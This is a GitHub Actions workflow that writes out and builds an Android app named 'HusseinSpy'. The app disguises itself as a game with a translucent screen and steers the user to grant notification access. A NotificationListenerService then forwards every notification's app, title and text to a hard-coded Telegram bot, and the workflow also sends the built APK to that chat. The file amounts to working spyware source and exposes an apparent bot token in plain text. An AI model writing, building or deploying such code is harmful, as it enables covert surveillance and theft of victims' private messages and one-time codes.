name: Hussein Notification Pro - FINAL FIX

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      # 🔥 تنظيف كامل للنظام
      - name: 🧹 Full System Clean
        run: |
          rm -rf ~/.gradle
          rm -rf .gradle
          rm -rf gradle
          rm -f gradlew gradlew.bat
          mkdir -p gradle/wrapper

      # ✅ تثبيت Gradle من المصدر الرسمي
      - name: Install Gradle 8.2
        run: |
          wget -q https://services.gradle.org/distributions/gradle-8.2-bin.zip
          unzip -q gradle-8.2-bin.zip
          sudo mv gradle-8.2 /opt/gradle
          echo "/opt/gradle/bin" >> $GITHUB_PATH
          gradle --version

      # 📝 إنشاء Gradle Wrapper باستخدام Gradle المثبت
      - name: Create Gradle Wrapper
        run: |
          gradle wrapper --gradle-version=8.2
          chmod +x gradlew

      # 📝 إنشاء gradle.properties
      - name: Create gradle.properties
        run: |
          cat <<EOF > gradle.properties
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          org.gradle.daemon=false
          EOF

      - name: 🛠️ Create Project
        run: |
          mkdir -p app/src/main/java/com/hussein/spy
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/layout

          # settings.gradle
          cat <<EOF > settings.gradle
          include ':app'
          rootProject.name = "HusseinSpy"
          EOF

          # build.gradle
          cat <<EOF > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          # app/build.gradle
          cat <<EOF > app/build.gradle
          apply plugin: 'com.android.application'
          
          android {
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.hussein.spy"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              
              buildTypes {
                  release {
                      minifyEnabled false
                  }
                  debug {
                      minifyEnabled false
                  }
              }
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF

          # AndroidManifest.xml
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest package="com.hussein.spy">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              
              <application 
                  android:label="Hussein Spy" 
                  android:theme="@style/AppTheme"
                  android:icon="@drawable/ic_launcher">
                  
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  
                  <service android:name=".NotificationService"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
                  
              </application>
          </manifest>
          EOF

          # styles.xml
          cat <<EOF > app/src/main/res/values/styles.xml
          <resources>
              <style name="AppTheme" parent="Theme.AppCompat.Light.NoActionBar">
                  <item name="android:windowBackground">@android:color/transparent</item>
                  <item name="android:windowIsTranslucent">true</item>
              </style>
          </resources>
          EOF

          # ic_launcher.xml
          cat <<EOF > app/src/main/res/drawable/ic_launcher.xml
          <shape>
              <solid android:color="#FF5722"/>
              <corners android:radius="10dp"/>
          </shape>
          EOF

          # MainActivity.java
          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
          package com.hussein.spy;
          
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.LinearLayout;
          import android.widget.TextView;
          import android.widget.Button;
          import android.graphics.Color;
          import android.view.Gravity;
          
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  startService(new Intent(this, NotificationService.class));
                  
                  LinearLayout layout = new LinearLayout(this);
                  layout.setOrientation(LinearLayout.VERTICAL);
                  layout.setGravity(Gravity.CENTER);
                  layout.setBackgroundColor(Color.parseColor("#FF5722"));
                  
                  TextView tv = new TextView(this);
                  tv.setText("🎮 HUSSEIN GAME");
                  tv.setTextColor(Color.WHITE);
                  tv.setTextSize(24);
                  
                  Button btn = new Button(this);
                  btn.setText("OPEN SETTINGS");
                  btn.setOnClickListener(v -> {
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  });
                  
                  layout.addView(tv);
                  layout.addView(btn);
                  setContentView(layout);
              }
          }
          EOF

          # NotificationService.java
          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
          package com.hussein.spy;
          
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.os.Bundle;
          import android.app.Notification;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          
          public class NotificationService extends NotificationListenerService {
              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  Bundle extras = sbn.getNotification().extras;
                  String title = extras.getString(Notification.EXTRA_TITLE, "");
                  String text = extras.getString(Notification.EXTRA_TEXT, "");
                  String app = sbn.getPackageName();
                  
                  String message = app + ": " + title + " - " + text;
                  sendToTelegram(message);
              }
              
              private void sendToTelegram(final String msg) {
                  new Thread(() -> {
                      try {
                          String url = "https://api.telegram.org/bot" + TOKEN + 
                                       "/sendMessage?chat_id=" + CHAT_ID + 
                                       "&text=" + URLEncoder.encode(msg, "UTF-8");
                          HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                          conn.setRequestMethod("GET");
                          conn.getResponseCode();
                          conn.disconnect();
                      } catch (Exception e) {}
                  }).start();
              }
          }
          EOF

      - name: 🚀 Build
        run: |
          ./gradlew clean assembleDebug --stacktrace

      - name: 📤 Send
        run: |
          APK=$(find app/build/outputs -name "*.apk" | head -n 1)
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
            -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -F "document=@$APK" \
            -F "caption=✅ تم البناء بنجاح"
